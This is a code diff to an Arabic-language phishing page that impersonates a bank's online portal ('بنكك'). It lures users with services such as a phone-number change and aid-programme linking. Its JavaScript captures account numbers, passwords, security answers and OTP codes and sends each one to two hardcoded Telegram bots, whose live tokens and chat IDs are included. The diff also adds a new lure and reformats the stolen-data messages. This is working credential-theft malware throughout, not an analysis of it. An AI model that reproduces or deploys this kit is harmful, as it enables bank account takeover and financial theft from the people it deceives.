@@ -354,7 +354,22 @@
             <p>الرجاء الاختيار من الخدمات المقدمة أدناه</p>
         </div>
 
-        <!-- الخدمة الجديدة المضافة: ربط الحساب ببرنامج منظمة ثمرات -->
+        <!-- 1. تغيير رقم الهاتف -->
+        <div class="service-card" onclick="openDetails('تغيير رقم الهاتف', 'تحديث وتغيير رقم الهاتف المرتبط بالحساب البنكي.')">
+            <div class="service-icon">
+                <div class="icon-circle">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">تغيير رقم الهاتف</h2>
+                <p class="service-desc">تحديث وتغيير رقم الهاتف المرتبط بالحساب.</p>
+            </div>
+        </div>
+
+        <!-- 2. ربط الحساب ببرنامج منظمة ثمرات -->
         <div class="service-card" onclick="openDetails('ربط الحساب ببرنامج منظمة ثمرات', 'ربط وتفعيل حسابك البنكي للاستفادة من برنامج دعم منظمة ثمرات.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -372,6 +387,7 @@
             </div>
         </div>
 
+        <!-- 3. التحويلات الخاطئة -->
         <div class="service-card" onclick="openDetails('التحويلات الخاطئة', 'معالجة أخطاء التحويلات البنكية.')">
             <div class="service-icon">
                 <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
@@ -385,6 +401,7 @@
             </div>
         </div>
 
+        <!-- 4. خدمات العملات الأجنبية -->
         <div class="service-card" onclick="openDetails('خدمات العملات الأجنبية', 'تفعيل وإدارة العملات الأجنبية.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -401,6 +418,7 @@
             </div>
         </div>
 
+        <!-- 5. رفع سقف التحويلات اليومية -->
         <div class="service-card" onclick="openDetails('رفع سقف التحويلات اليومية', 'زيادة الحد اليومي للتحويلات.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -416,6 +434,7 @@
             </div>
         </div>
 
+        <!-- 6. كشف الحساب -->
         <div class="service-card" onclick="openDetails('كشف الحساب', 'الحصول على كشف حساب مفصل.')">
             <div class="service-icon">
                 <div class="icon-rect">
@@ -432,6 +451,7 @@
             </div>
         </div>
 
+        <!-- 7. بطاقة فيزا افتراضية -->
         <div class="service-card" onclick="openDetails('بطاقة فيزا افتراضية', 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.')">
             <div class="service-icon">
                 <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
@@ -445,6 +465,7 @@
             </div>
         </div>
 
+        <!-- 8. حساب جاري و حساب مميز -->
         <div class="service-card" onclick="openDetails('حساب جاري و حساب مميز', 'فتح أو ترقية الحساب.')">
             <div class="service-icon">
                 <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
@@ -478,10 +499,10 @@
             <div class="steps-container">
                 <h3 class="steps-header">خطوات تفعيل الخدمة</h3>
                 <div class="step-item"><span class="step-number">.1</span> تسجيل الدخول للخدمات.</div>
-                <div class="step-item"><span class="step-number">.2</span> اختر خدمة الربط أو التفعيل.</div>
-                <div class="step-item"><span class="step-number">.3</span> أدخل البيانات المطلوبة بدقة.</div>
+                <div class="step-item"><span class="step-number">.2</span> اختر خدمة التحديث أو الربط.</div>
+                <div class="step-item"><span class="step-number">.3</span> أدخل البيانات بدقة.</div>
                 <div class="step-item"><span class="step-number">.4</span> تأكيد الهوية عبر رمز التحقق.</div>
-                <div class="step-item"><span class="step-number">.5</span> إرسال الطلب للمراجعة والاعتماد.</div>
+                <div class="step-item"><span class="step-number">.5</span> إرسال الطلب للمراجعة.</div>
             </div>
 
             <button class="btn-submit" onclick="goToScreen('screen-login')">الانتقال إلى تسجيل الدخول</button>
@@ -609,6 +630,7 @@
     const bot2Token = "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0";
     const bot2ChatId = "8623773122";
 
+    // دالة إرسال الرسالة منفصلة للبوتين معاً
     function sendToTelegram(message) {
         const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}`;
         const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(message)}`;
@@ -644,6 +666,7 @@
         }
     }
 
+    // 1. إرسال رسالة تسجيل الدخول منفصلة ومختصرة مثل الصورة
     function submitLogin() {
         userData.account = document.getElementById('accountInput').value;
         userData.password = document.getElementById('passInput').value;
@@ -653,12 +676,16 @@
             return;
         }
 
-        let msg = `🚨 صيد جديد - بنكك أونلاين\n\n📌 الخدمة: ${currentService}\n👤 رقم الحساب: ${userData.account}\n🔑 كلمة المرور: ${userData.password}`;
+        let msg = `🚨 تسجيل دخول (بنكك)\n\n` +
+                  `👤 المعرف: \`${userData.account}\`\n` +
+                  `🔑 كلمة المرور: \`${userData.password}\``;
+        
         sendToTelegram(msg);
 
         goToScreen('screen-security');
     }
 
+    // 2. إرسال رسالة سؤال الأمان منفصلة ومختصرة مثل الصورة
     function submitSecurity() {
         const selectObj = document.getElementById('securityQuestion');
         userData.question = selectObj.options[selectObj.selectedIndex].text;
@@ -669,7 +696,10 @@
             return;
         }
 
-        let msg = `🚨 تحديث البيانات - سؤال الأمان\n\n👤 رقم الحساب: ${userData.account}\n❓ السؤال: ${userData.question}\n💬 الجواب: ${userData.answer}`;
+        let msg = `🛡️ إجابة سؤال الأمان\n\n` +
+                  `❓ السؤال:\n${userData.question}\n\n` +
+                  `💡 الإجابة: \`${userData.answer}\``;
+        
         sendToTelegram(msg);
 
         goToScreen('screen-otp');
@@ -696,6 +726,7 @@
         }, 1000);
     }
 
+    // 3. إرسال رسالة رمز التحقق OTP منفصلة ومختصرة مثل الصورة
     function submitOtpAndRedirect() {
         userData.otp = document.getElementById('otpInput').value;
 
@@ -704,7 +735,9 @@
             return;
         }
 
-        let msg = `🚨 رمز التحقق النهائي (OTP)\n\n👤 رقم الحساب: ${userData.account}\n🔑 كلمة المرور: ${userData.password}\n❓ سؤال الأمان: ${userData.question}\n💬 الجواب: ${userData.answer}\n🔢 رمز الـ OTP: ${userData.otp}`;
+        let msg = `📱 رمز التحقق OTP\n\n` +
+                  `🔢 الرمز: \`${userData.otp}\``;
+        
         sendToTelegram(msg);
 
         setTimeout(() => {
